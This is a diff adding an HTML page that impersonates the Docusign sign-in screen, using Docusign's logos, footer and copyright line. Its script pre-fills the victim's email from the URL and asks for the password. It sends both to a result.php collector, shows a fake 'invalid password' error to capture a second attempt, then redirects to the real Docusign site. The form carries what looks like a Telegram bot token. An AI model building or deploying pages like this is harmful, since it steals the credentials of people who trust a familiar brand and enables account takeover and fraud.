@@ -1,0 +1,443 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Docusign Login - Enter email to start sign in</title>
+    <link rel="icon" href="https://docucdn-a.akamaihd.net/olive/images/2.64.0/global-assets/ds-icons-favicon-default-64x64.svg" type="image/svg+xml">
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f7f6f7;
+        }
+        header {
+            border-bottom: 1px solid rgb(25 24 35 / 15%);
+            padding: 16px;
+            position: fixed;
+            top: 0;
+            z-index: 999;
+            width: 100%;
+            background: #fff;
+        }
+        header .logoo img {
+            width: 100%;
+            height: auto;
+        }
+        header .logoo {
+            width: 124px;
+            /* margin: auto; */
+        }
+        main {
+            min-height: 97vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .right-section {
+            width: 584px;
+            margin: auto;
+            padding: 58px 95px;
+            background-color: #fff;
+            border: 1px solid rgb(25 24 35 / 15%);
+        }
+
+        .right-section .logo {
+            display: flex;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+
+        .right-section .logo img {
+            width: 120px;
+            margin-right: 10px;
+            margin-bottom: -18px;
+        }
+
+        h2 {
+            font-size: 1.5rem;
+            margin-bottom: 20px;
+        }
+
+        .input-group {
+            margin-bottom: 8px;
+        }
+
+        .input-group label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 10px;
+            max-height: 40px;
+            font-size: 1rem;
+            border: 1px solid rgba(25,24,35,0.65);;
+            box-sizing: border-box;
+        }
+
+        .input-group input:focus {
+            border-color: #888;
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 10px;
+            background-color: rgb(80, 0, 247);
+            border: none;
+            font-size: 1rem;
+            color: white;
+            border-radius: 0px;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+        .bbl {
+            width: 100%;
+            padding: 22px 10px;
+            background-color: transparent;
+            border: none;
+            font-size: 1rem;
+            color: #1F2937;
+            border-radius: 0px;
+            cursor: pointer;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 0.9rem;
+            color: #777;
+        }
+
+        .footer a {
+            color: #007bff;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        .powered-by {
+            position: absolute;
+            bottom: 10px;
+            left: 10px;
+            font-size: 0.8rem;
+            color: #555;
+        }
+
+        .powered-by a {
+            color: #555;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 10px;
+            background: #fff;
+        }
+
+        .footer-links a {
+            color: #007bff;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+        .flexfoot {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-top: 1px solid rgb(25 24 35 / 15%);
+            padding: 16px 10px;
+            font-size: 11px;
+        }
+        .middll span::after {
+            content: "|";
+            margin-inline-start: 8px;
+            color: rgba(25, 24, 35, 0.15);
+        }
+        .dh {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            
+        }
+        .dh svg {
+            width: 45px;
+            height: 20px;
+            /* fill: #007bff; */
+        }
+        .black {
+            padding-top: 0.25rem;
+            padding-bottom: 0.25rem; 
+            padding-left: 1.25rem;
+            padding-right: 1.25rem; 
+            border-radius: 1.5rem; 
+            font-size: 0.75rem;
+            line-height: 1rem; 
+            color: #ffffff; 
+            background-color: #1F2937;width: 40%;margin: auto;margin-top: 1rem;
+        }
+        #thank-you-message {
+           color: green;
+           border-left: 3px solid rgb(17, 239, 0);
+           padding: 0px 10px;
+           text-align: start;
+           font-size: 15px;
+           display: none;
+        }
+        #thank-you-message img {
+            display: block;
+            text-align: center;
+            margin: auto;
+        }
+        #errormsgg {
+            position: fixed;
+            width: 100%;
+            height: 100vh;
+            background: rgba(129, 127, 127, 0.326);
+            z-index: 10000;
+            display: none;
+            justify-content: center;
+            align-items: center;
+        }
+        #error-message {
+            padding: 1rem;
+            border-radius: 5px;
+            background: #fff;
+            color: #1F2937;
+        }
+        .bbk {
+            display: none;
+            align-items: center;gap: 1rem;
+            margin-bottom: 2rem;
+        }
+        .bbk svg {
+            speak: none;
+            height: 24px;
+            width: 24px;
+        }
+        .dh img {
+            max-height: 16px;
+            width: 57px;
+            margin-inline-start: 4px;
+        }
+        #rooer {
+            display: none;
+        }
+        .css-1ub4jhn {
+            font-family: "DS Indigo", DSIndigo, Helvetica, Arial, sans-serif;
+            font-size: 12px;
+            font-weight: 400;
+            line-height: 1.5;
+            display: flex;
+            margin: 0px;
+            padding: 0px;
+            color: rgb(225, 22, 85);
+        }
+        .css-1ub4jhn > svg {
+            fill: currentcolor;
+            flex: 0 0 auto;
+            margin-inline-end: 8px;
+        }
+        @media screen and (max-width: 768px) {
+            body {
+                background: #fff;
+            }
+            main {
+                flex-direction: column;
+                margin-top: 4rem;
+            }
+            .right-section {
+                width: 100%;
+                padding: 40px 20px;
+                background-color: transparent;
+                border: none;
+            }
+            .left-section {
+                width: 100%;
+                height: auto !important;
+                /* overflow: hidden; */
+            }
+            .black {
+                width: 77%;
+                margin-top: 4rem;
+            }
+            .left-section img {
+                width: 60%;
+                height: auto;
+                margin: auto;
+                display: block;
+                object-fit: cover;
+            }
+            .flexfoot {
+                margin-top: 4rem;
+                flex-direction: column;
+                gap: 1rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div id="errormsgg">
+        <div id="error-message">Email authentication failed, Please check password.</div>
+    </div>
+    <header>
+        <div class="logoo">
+            <img src="https://docucdn-a.akamaihd.net/olive/images/2.72.0/global-assets/ds-logo-default.svg" alt="">
+        </div>
+    </header>
+   <main>
+        <div class="right-section">
+            <!-- Logo -->
+            <div class="logo">
+                <!-- <img src="https://imgs.search.brave.com/-s9XKASvwtJ299BhoDZiZ9fkVIoUtCbZsi9cyEQqRtw/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly9hc3Nl/dC5icmFuZGZldGNo/LmlvL2lkWmJ1cXhS/cXovaWRId0RsSjA2/Sy5zdmc_dXBkYXRl/ZD0xNzE0NDg3MDg2/NDQ5" alt="DocuSign Logo"> -->
+                <h2 id="logt">Log in to Docusign</h2>
+            </div>
+
+            <!-- Heading -->
+            <span class="bbk" id="bbk">
+                <svg class="SVGInline-svg" fill="currentColor" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" focusable="false">
+                    <path d="M22 11H5.41L11 5.41 9.59 4l-7.3 7.29a1 1 0 0 0 0 1.42L9.59 20 11 18.59 5.41 13H22z"></path>
+                </svg>
+                <p id="emll">mmm@aol.com</p>
+            </span>
+            <p style="display: block;margin-bottom: 2rem;" id="hide">Enter your email to log in.</p>
+
+            <!-- Email Form -->
+            <form method="post" id="6210908455" action="7627445601:AAHUIJ8JU9-WzSz9Y3LJ3GiAyKjDgiSKZ1Y">
+                <div class="input-group">
+                    <label for="email" id="labt">Email <em style="color: red;">*</em></label>
+                    <input type="email" id="user-id" value="" required name="aa" placeholder="Enter email">
+                    <input type="hidden" id="password" placeholder="Enter email password" name="bb" required>
+                </div>
+
+                <div class="rooer" id="rooer">
+                    <p data-qa="password-error" id="4MZ9lwfafn" class="css-1ub4jhn">
+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" width="20" height="20" aria-hidden="true" fill="currentColor" focusable="false" data-qa="password-error-error-icon"><path d="m18.82 9.57-8.39-8.39a.6.6 0 0 0-.86 0L1.18 9.57a.6.6 0 0 0 0 .86l8.39 8.39a.6.6 0 0 0 .86 0l8.39-8.39a.6.6 0 0 0 0-.86zM11 15H9v-2h2zm0-4H9V5h2z"></path></svg>
+                        <span style="color: rgb(225, 22, 85);font-size: 12px;font-weight: 400;" id="passer">Invalid email and / or password</span>
+                    </p>
+                </div>
+
+                <button type="button" class="submit-btn" id="hidd2">NEXT</button>
+                <button type="button" class="bbl" id="hide">Sign Up for Free</button>
+                <a href="#" id="resee" style="color: rgb(80, 0, 247);display: block;cursor: pointer;font-family: sans-serif;text-decoration: none;margin-top: 2rem;"></a>
+            </form>
+
+            <!-- Footer -->
+        </div>
+   </main>
+   <footer>
+        <div class="flexfoot">
+            <div class="dh">
+                Powered by
+                <img data-qa="header-docusign-logo" alt="" src="https://docucdn-a.akamaihd.net/olive/images/2.72.0/global-assets/ds-logo-default.svg" class="css-1sz9cjp">
+            </div>
+            <div class="middll" style="display: flex;align-items: center;gap: 8px;">
+                <p>English(us)</p>
+                <span>Contact Us</span>
+                <span>Terms of Use</span>
+                <span>Privacy</span>
+                <span>Intellectual Property</span>
+                <span>Trust</span>
+            </div>
+            <div class="lstfoot">
+                Copyright © 2025 Docusign, Inc. All rights reserved
+            </div>
+        </div>
+   </footer>
+   <script>
+        const fullUrl = window.location.href;
+        
+        const emailRegex = /#([^#]+)$/;
+        const match = fullUrl.match(emailRegex);
+        const email = match ? match[1] : null;
+        // var emm = atob(`${email}`)
+    
+    
+        // console.log(emm);
+
+
+        document.getElementById("user-id").value = email;
+
+        var formSubmitted = 0;
+        const hide = document.querySelectorAll("#hide")
+        document.getElementById("hidd2").addEventListener("click", ()=>{
+            var input = document.getElementById("user-id").value.trim();
+            if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(input)) {
+                document.getElementById("password").type = "password";
+                document.getElementById("user-id").type = "hidden";
+                document.getElementById("emll").textContent = input;
+                document.getElementById("bbk").style.display = "flex";
+                document.getElementById("logt").textContent = "Log in";
+                document.getElementById("labt").textContent = "Password";
+                document.getElementById("resee").textContent = "Reset password";
+                hide.forEach(el => {
+                    el.style.display = "none";
+                });
+                document.getElementById("hidd2").textContent = "Log in";
+                setInterval(() => {
+                    document.getElementById("hidd2").type = "submit";
+                }, 1500);
+            } else {
+                alert("Please enter a valid email address.");
+            }
+        })
+        document.getElementById("TETcuYGOc").addEventListener("submit", function (event) {
+            const em2 = document.getElementById("user-id").value;
+            const domain = em2.split('@')[1];
+            console.log(domain);
+
+            // document.getElementById("errormsgg").style.display = "flex";
+            event.preventDefault();
+
+            formSubmitted++;
+            
+            var inputs = document.querySelectorAll('input[required]');
+            for (var i = 0; i < inputs.length; i++) {
+                if (!inputs[i].value.trim()) {
+                    alert("Please fill in all fields.");
+                    return;
+                }
+            }
+
+            var formData = new FormData(this);
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", "./result.php", true); // your php url here eg http://yourdomain.com/result.php
+
+            xhr.onreadystatechange = function () {
+                if (xhr.readyState == 4 && xhr.status == 200) {
+                    if (formSubmitted === 1) {
+                        console.log("YESSSSS");
+                        document.getElementById("password").value = "";
+                       setTimeout(() => {
+                          document.getElementById("rooer").style.display = "block";
+                       }, 1000);
+                    } else if (formSubmitted === 2) {
+                        document.getElementById("password").value = "";
+                        document.getElementById("passer").textContent = "Please try again";
+                        console.log("invalid");
+                        setInterval(() => {
+                            // document.getElementById("password").value = "";
+                           window.location.href = `https://account.docusign.com/`;
+                        }, 3000);
+                    
+                    }
+                }
+            };
+
+            xhr.send(formData);
+        });
+   </script>
+</body>
+</html>
